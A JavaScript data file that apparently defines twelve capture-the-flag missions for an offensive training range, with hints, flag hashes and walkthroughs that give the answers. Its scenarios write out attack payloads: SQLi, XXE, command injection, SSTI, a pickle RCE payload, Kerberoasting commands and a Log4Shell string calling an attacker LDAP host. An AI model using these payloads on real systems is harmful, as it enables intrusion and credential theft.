/* ============================================================
   FURIOS-INT // RED_OPS RANGE MISSION DATABASE v1.0
   Offensive web / cloud / AD range. 12 missions.
   Tracks: WEB_RECON, AUTH_BYPASS, SSRF/XXE, INJECTION,
           DESERIALIZE/RCE, AD_OFFENSE
   ============================================================ */
window.RX_MISSIONS = [

  // -------- TIER 1: ROOKIE (3) --------
  {
    id:'r01', tier:'rookie', skill:'WEB_RECON', points:75, solves:2104,
    title:'robots.txt Whisper',
    requires:[],
    flagHash:'9871c153cae63e0cdd33237b75b7f24a78c3f2ad8b79ae388927fc87845299c0',
    brief:'Target a freshly-deployed CTF web app. Find a hidden directive that points to a privileged surface. Flag is two words: <directive>_<path-leaf>.',
    scenario:[
      '$ curl -s https://target.fllc-range.local/robots.txt',
      'User-agent: *',
      'Disallow: /admin/',
      'Disallow: /backup/',
      'Disallow: /.git/',
      'Sitemap: https://target.fllc-range.local/sitemap.xml',
      '',
      '$ curl -s https://target.fllc-range.local/admin/ -I',
      'HTTP/1.1 401 Unauthorized'
    ].join('\n'),
    lab:'robots.txt + 401 — admin path is intentionally disallowed.',
    hints:[
      'Web crawlers honor robots.txt. Look at the verb being used.',
      'It is the keyword that tells crawlers NOT to visit a path.',
      'Combine: robots_<verb>_<leaf-of-/admin/>.'
    ],
    walkthrough:[
      'robots.txt uses the Disallow directive to keep crawlers out of /admin/.',
      'Flag = `robots_disallow_admin`.'
    ].join('\n')
  },

  {
    id:'r02', tier:'rookie', skill:'AUTH_BYPASS', points:100, solves:1820,
    title:'Insecure Direct Object',
    requires:[],
    flagHash:'dcbd2b0422c9a81e2516429c6ef34840bd582c65f58f1281dc046eb343dc4c05',
    brief:'You are authenticated as user_id=7. The dashboard exposes /api/profile?id=7. You suspect IDOR. Find the lowest-numbered admin profile.',
    scenario:[
      '$ curl -s "https://target/api/profile?id=7" -H "Authorization: Bearer $T"',
      '{"id":7,"role":"user","email":"you@fllc"}',
      '$ for i in 1 2 3 ... 50; do curl -s "https://target/api/profile?id=$i" -H "Authorization: Bearer $T" | jq -c \'{id,role}\'; done',
      '{"id":1,"role":"user"}',
      '{"id":2,"role":"user"}',
      '...',
      '{"id":42,"role":"admin"}',
      '{"id":43,"role":"user"}'
    ].join('\n'),
    lab:'Brute-force /api/profile?id=N. Server only checks the bearer is valid — not whose object you read.',
    hints:[
      'IDOR = server enforces authentication but not authorization on the object id.',
      'Iterate id parameter, look at the role field.',
      'Flag format: idor_user_<lowest admin id>.'
    ],
    walkthrough:[
      'Iterate id=1..N. id=42 returns role=admin → IDOR confirmed.',
      'Flag = `idor_user_42`.'
    ].join('\n')
  },

  {
    id:'r03', tier:'rookie', skill:'AUTH_BYPASS', points:150, solves:1430,
    title:'JWT alg Confusion',
    requires:['r02'],
    flagHash:'7eb489caa60b15d5a7a05f7830a0e94a704a8f1ff377dd2595bb3ef9ac58dc8d',
    brief:'A poorly-configured JWT validator accepts unsigned tokens. Forge an admin JWT by abusing the algorithm header.',
    scenario:[
      '$ jwt-cli decode "$ORIG_TOKEN"',
      'header  = {"alg":"HS256","typ":"JWT"}',
      'payload = {"sub":"you","role":"user","exp":9999999999}',
      'signature = ...',
      '',
      '$ jwt-cli forge --alg none --payload \'{"sub":"you","role":"admin","exp":9999999999}\' > t.txt',
      '$ curl -H "Authorization: Bearer $(cat t.txt)" https://target/api/admin/me',
      '{"role":"admin","ok":true}'
    ].join('\n'),
    lab:'Server accepts alg=none. Forge a token with no signature, role=admin → admin granted.',
    hints:[
      'JWT supports an "alg" header. The dangerous value asserts there is no signature.',
      'Set alg to that magic word; clear the signature segment.',
      'Flag = jwt_alg_<keyword>.'
    ],
    walkthrough:[
      'CVE-pattern: alg=none acceptance. Re-encode header.alg = "none" and drop signature.',
      'Flag = `jwt_alg_none`.'
    ].join('\n')
  },

  // -------- TIER 2: OPERATIVE (3) --------
  {
    id:'r04', tier:'operative', skill:'SSRF', points:225, solves:870,
    title:'Cloud Metadata Probe',
    requires:['r01','r02'],
    flagHash:'ce9c7fdbde41ac27d2c2bc80e174fade261f99fec5b8fb695b814f877c60bbe8',
    brief:'A URL-fetch endpoint accepts arbitrary URLs server-side. Pivot via SSRF to the AWS instance metadata service.',
    scenario:[
      'POST /api/url-preview',
      '{"url":"https://google.com"}',
      '> 200 OK { "title":"Google" }',
      '',
      '{"url":"http://169.254.169.254/latest/meta-data/"}',
      '> 200 OK { "title":"iam/security-credentials/web-role" }'
    ].join('\n'),
    lab:'IMDSv1 reachable via the proxy endpoint. Classic cloud SSRF.',
    hints:[
      'Cloud metadata service IPv4 is the link-local 169.254.169.254 endpoint.',
      'Format: ssrf_<dotted ip with underscores>.',
      'Replace dots with underscores.'
    ],
    walkthrough:[
      'Confirm SSRF by hitting metadata IP. Pivot to /latest/meta-data/iam/security-credentials/.',
      'Flag = `ssrf_169_254_169_254`.'
    ].join('\n')
  },

  {
    id:'r05', tier:'operative', skill:'XXE', points:250, solves:740,
    title:'XML External Entity',
    requires:['r01'],
    flagHash:'b3ac18cf37f109c9a535ef5f9d4a7a90549bdd05b5900746f67fb8e8850c6d45',
    brief:'A SOAP-style /api/import endpoint parses XML with external entities enabled. Read /etc/passwd from the server.',
    scenario:[
      '<?xml version="1.0"?>',
      '<!DOCTYPE foo [',
      '  <!ENTITY xxe SYSTEM "file:///etc/passwd">',
      ']>',
      '<import><name>&xxe;</name></import>',
      '',
      '> 200 OK',
      '> {"imported":"root:x:0:0:root:/root:/bin/bash\\nbin:x:1:1:bin..."}'
    ].join('\n'),
    lab:'Classic XXE — DOCTYPE + ENTITY + file:// URI resolved server-side.',
    hints:[
      'XXE abuses external entity resolution.',
      'Target file is the canonical Linux user database.',
      'Flag = xxe_<path with / replaced by _>.'
    ],
    walkthrough:[
      'Inject DOCTYPE with ENTITY xxe SYSTEM "file:///etc/passwd"; reference it in body.',
      'Flag = `xxe_etc_passwd`.'
    ].join('\n')
  },

  {
    id:'r06', tier:'operative', skill:'INJECTION', points:275, solves:910,
    title:'Boolean SQLi 101',
    requires:['r02'],
    flagHash:'519c6f3d2c1a9e50257952e75e249425881d4eeb01facca9d66c6a342ba83681',
    brief:'A login form is vulnerable to classic SQLi. Identify the canonical bypass payload.',
    scenario:[
      'username: admin\' OR 1=1 --',
      'password: anything',
      '',
      '> [server] SELECT * FROM users WHERE username=\'admin\' OR 1=1 -- \' AND password=\'...\'',
      '> [server] returned 1 row -> session granted as admin'
    ].join('\n'),
    lab:'Auth query concatenates username unsafely.',
    hints:[
      'The classic SQLi auth bypass uses an always-true tautology.',
      'Flag is words: sqli_<tautology with no spaces>.',
      'Tautology = OR 1=1.'
    ],
    walkthrough:[
      'Append `\' OR 1=1 --` to bypass auth.',
      'Flag = `sqli_or_1_1`.'
    ].join('\n')
  },

  // -------- TIER 3: ELITE (3) --------
  {
    id:'r07', tier:'elite', skill:'TEMPLATE_INJECTION', points:400, solves:312,
    title:'Jinja2 SSTI',
    requires:['r05','r06'],
    flagHash:'dfa108e5736702877169db50f3a39ee6364b8fe1495a11a502d71caac41eeb88',
    brief:'A Flask app reflects a name parameter into a Jinja2 template unsafely. Confirm SSTI by reading the app config.',
    scenario:[
      'GET /hello?name={{7*7}}     -> Hello 49',
      'GET /hello?name={{config}}  -> <Config {... \'SECRET_KEY\':\'s3cret\'}>',
      'GET /hello?name={{config.items()}} -> dict_items([(\'SECRET_KEY\',\'s3cret\'), ...])'
    ].join('\n'),
    lab:'Flask + Jinja2; render_template_string(user_input).',
    hints:[
      '{{ }} is Jinja2 expression syntax.',
      'The flag identifies the engine and the leaked global.',
      'Format: ssti_<engine>_<global var>.'
    ],
    walkthrough:[
      '{{config}} returns the Flask config object → SECRET_KEY leak.',
      'Flag = `ssti_jinja_config`.'
    ].join('\n')
  },

  {
    id:'r08', tier:'elite', skill:'INJECTION', points:425, solves:268,
    title:'Command Injection',
    requires:['r06'],
    flagHash:'690e18cea7022399005cfd5d90a548cd0e632a2b3ca4d1ccbeeff0ecf3d553c5',
    brief:'A network-tool endpoint passes user input directly to a shell. Confirm RCE by running a benign identity command.',
    scenario:[
      'POST /api/ping   {"host":"127.0.0.1; id"}',
      '> [server] exec("ping -c 1 127.0.0.1; id")',
      '> stdout:',
      '> 64 bytes from 127.0.0.1: time=0.04ms',
      '> uid=33(www-data) gid=33(www-data) groups=33(www-data)'
    ].join('\n'),
    lab:'String-concatenation into a shell call. Classic command injection.',
    hints:[
      'Use ; or && to chain commands.',
      'Run the unix command that prints the current user.',
      'Flag = rce_<technique short>_<command>.'
    ],
    walkthrough:[
      'Append `; id` to break out of the ping command and leak uid.',
      'Flag = `rce_cmdi_id`.'
    ].join('\n')
  },

  {
    id:'r09', tier:'elite', skill:'PROTO_POLLUTION', points:475, solves:198,
    title:'Prototype Pollution → Admin',
    requires:['r03'],
    flagHash:'a957e44e167bced4b2b0251b2fd5890cf439ef121239228d163312a5c1e80249',
    brief:'A node.js app merges user JSON into a config object using a recursive deep-merge. Pollute Object.prototype to gain admin.',
    scenario:[
      'POST /api/prefs',
      '{"theme":"dark","__proto__":{"isAdmin":true}}',
      '',
      '$ curl /api/me   -> {"user":"alice","isAdmin":true}',
      '// every object now has isAdmin=true via prototype chain'
    ].join('\n'),
    lab:'Deep merge does not exclude __proto__/constructor — Object.prototype mutated.',
    hints:[
      'JS prototype chain: every object inherits from Object.prototype.',
      'Pollute __proto__.isAdmin = true to grant ambient admin.',
      'Flag = prototype_pollution_<role-granted>.'
    ],
    walkthrough:[
      'POST __proto__ key in JSON; deep merge writes to Object.prototype.',
      'Flag = `prototype_pollution_admin`.'
    ].join('\n')
  },

  // -------- TIER 4: CLASSIFIED (3) --------
  {
    id:'r10', tier:'classified', skill:'DESERIALIZATION', points:600, solves:91,
    title:'Log4Shell',
    requires:['r08'],
    flagHash:'783efd4f7b42aae1e8bcb1325d0ca906be45b3df56e6688d277418aeac4203c1',
    brief:'Submit a User-Agent that triggers JNDI lookup in a vulnerable Java backend. Identify the technique by CVE-pattern words.',
    scenario:[
      'GET /search HTTP/1.1',
      'User-Agent: ${jndi:ldap://attacker.fllc/Exploit}',
      '',
      'log4j2 evaluates the lookup -> JVM reaches out to attacker LDAP -> deserializes class -> RCE',
      'CVE-2021-44228'
    ].join('\n'),
    lab:'log4j2 (<2.15) Lookup substitution within format strings.',
    hints:[
      'The vulnerability has a famous nickname.',
      'It abuses ${jndi:...} substitution.',
      'Flag = log4shell_<protocol1>_<protocol2>.'
    ],
    walkthrough:[
      'Use ${jndi:ldap://...} in any logged input. Server fetches & deserializes a remote class.',
      'Flag = `log4shell_jndi_ldap`.'
    ].join('\n')
  },

  {
    id:'r11', tier:'classified', skill:'DESERIALIZATION', points:700, solves:54,
    title:'Pickle of Doom',
    requires:['r10'],
    flagHash:'6c677216168ca563a187aabc8b74c13f3766a59dc9fa87a280fc9bbb0eea0a8e',
    brief:'A Python service accepts base64-encoded session data and feeds it directly into pickle.loads(). Build a payload with __reduce__.',
    scenario:[
      'class P:',
      '  def __reduce__(self):',
      '    return (os.system, ("id > /tmp/x",))',
      '',
      'payload = base64.b64encode(pickle.dumps(P()))',
      'curl -b "session=$payload" https://target/api/me',
      '> server runs `id > /tmp/x`'
    ].join('\n'),
    lab:'pickle.loads() on attacker-controlled data is unconditional RCE.',
    hints:[
      'Python\'s native object serializer is the vulnerable codec.',
      'Format: deserialize_<codec>',
      'It rhymes with "tickle".'
    ],
    walkthrough:[
      'Build a class with __reduce__ returning a callable + args.',
      'Flag = `deserialize_pickle`.'
    ].join('\n')
  },

  {
    id:'r12', tier:'classified', skill:'AD_OFFENSE', points:850, solves:31,
    title:'Kerberoast a Service',
    requires:['r11'],
    flagHash:'a6a258efbe8b43b96df99b5cd4d92988f408dcf748060c10fec9b7ffd6c815bb',
    brief:'On a domain-joined host, request a TGS for any account with a registered SPN. Crack offline. Identify the technique.',
    scenario:[
      'PS> Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname',
      'svc-sql      MSSQLSvc/db01.fllc.local:1433',
      'svc-backup   HOST/backup01.fllc.local',
      '',
      'PS> Rubeus.exe kerberoast /user:svc-sql /outfile:hash.txt',
      '$ hashcat -m 13100 hash.txt rockyou.txt',
      '> svc-sql:Summer2025!'
    ].join('\n'),
    lab:'Service accounts with weak passwords + SPN registration are roastable.',
    hints:[
      'Technique name comes from the protocol (Kerberos) + verb suffix (-roast).',
      'It targets accounts with SPNs.',
      'Flag = ad_<technique>_<account-prefix>.'
    ],
    walkthrough:[
      'Request TGS for SPN-registered accounts; crack the encrypted ticket portion offline.',
      'Flag = `ad_kerberoast_svc`.'
    ].join('\n')
  }
];
